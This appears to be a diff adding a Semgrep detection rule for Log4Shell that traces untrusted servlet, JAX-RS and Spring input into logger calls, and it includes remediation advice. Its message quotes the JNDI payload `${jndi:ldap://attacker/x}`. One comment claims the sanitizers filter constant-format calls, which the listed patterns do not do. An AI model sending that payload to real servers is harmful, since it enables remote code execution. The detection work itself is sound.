@@ -1,0 +1,79 @@
+# Log4Shell (CVE-2021-44228) — untrusted input flows into any Log4j/SLF4J
+# logging call. Even on log4j >= 2.17.0 this is a log-injection surface and
+# a PII/credential-leak risk. Written to match ANY servlet / JAX-RS / Spring
+# handler on ANY logger (SLF4J, Log4j2, Log4j1, JBoss Logging).
+rules:
+  - id: log4j-message-lookup-injection
+    languages: [java, kotlin]
+    severity: ERROR
+    mode: taint
+    message: |
+      User-controlled input flows into a logger call. On log4j < 2.17.0 this is
+      exploitable via JNDI lookup (Log4Shell / CVE-2021-44228 — arbitrary code
+      execution via `${jndi:ldap://attacker/x}` embedded in the message).
+      Even after patching, logging untrusted values invites log injection,
+      log forgery, and PII/credential disclosure via aggregated log stores.
+
+      Fix: (1) upgrade log4j to >= 2.17.0 AND JVM flag
+      `-Dlog4j2.formatMsgNoLookups=true`, (2) never log request headers,
+      cookies, tokens or bodies directly — log an ID and look up the value
+      out-of-band, (3) sanitize non-critical fields with an allowlist encoder
+      before logging.
+    metadata:
+      cwe: 'CWE-117: Improper Output Neutralization for Logs'
+      owasp: 'A03:2021 Injection'
+      category: security
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      references:
+        - https://logging.apache.org/log4j/2.x/security.html
+        - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    pattern-sources:
+      # JAX-RS / Servlet — canonical parameter accessors
+      - pattern: $REQ.getParameter(...)
+      - pattern: $REQ.getHeader(...)
+      - pattern: $REQ.getHeaders(...)
+      - pattern: $REQ.getCookies()
+      - pattern: $REQ.getQueryString()
+      - pattern: $REQ.getRequestURI()
+      - pattern: $REQ.getPathInfo()
+      - pattern: $REQ.getInputStream()
+      - pattern: $REQ.getReader()
+      # JAX-RS annotated parameters (any framework: Dropwizard, RestEasy, Jersey)
+      - pattern: '@javax.ws.rs.PathParam(...) $T $X'
+      - pattern: '@javax.ws.rs.QueryParam(...) $T $X'
+      - pattern: '@javax.ws.rs.HeaderParam(...) $T $X'
+      - pattern: '@javax.ws.rs.CookieParam(...) $T $X'
+      - pattern: '@javax.ws.rs.FormParam(...) $T $X'
+      - pattern: '@jakarta.ws.rs.PathParam(...) $T $X'
+      - pattern: '@jakarta.ws.rs.QueryParam(...) $T $X'
+      - pattern: '@jakarta.ws.rs.HeaderParam(...) $T $X'
+      # Spring MVC annotations
+      - pattern: '@PathVariable(...) $T $X'
+      - pattern: '@RequestParam(...) $T $X'
+      - pattern: '@RequestHeader(...) $T $X'
+      - pattern: '@RequestBody(...) $T $X'
+      - pattern: '@ModelAttribute(...) $T $X'
+      # Netty / Undertow handler exchange
+      - pattern: $EXCHANGE.getRequestHeaders().get($K)
+      - pattern: $EXCHANGE.getQueryParameters()
+    pattern-sinks:
+      - pattern-either:
+          - pattern: $LOG.info($X, ...)
+          - pattern: $LOG.warn($X, ...)
+          - pattern: $LOG.error($X, ...)
+          - pattern: $LOG.debug($X, ...)
+          - pattern: $LOG.trace($X, ...)
+          - pattern: $LOG.fatal($X, ...)
+          - pattern: $LOG.log($LEVEL, $X, ...)
+          - pattern: $LOG.printf($LEVEL, $X, ...)
+    # Ignore places where the message is a constant format string and the taint
+    # is a positional parameter (semgrep's taint mode still flags these, but
+    # for log4j format-arg replacement (`{}` slots), lookup expansion isn't
+    # applied to args in log4j2 >= 2.16 — the constant-fmt-plus-args shape is
+    # much safer than concatenation. `pattern-sanitizers` filters that shape.)
+    pattern-sanitizers:
+      # Already sanitized — encoding or allowlist filtering
+      - pattern: $ENC.encodeForLog($X)
+      - pattern: org.owasp.encoder.Encode.forJava($X)
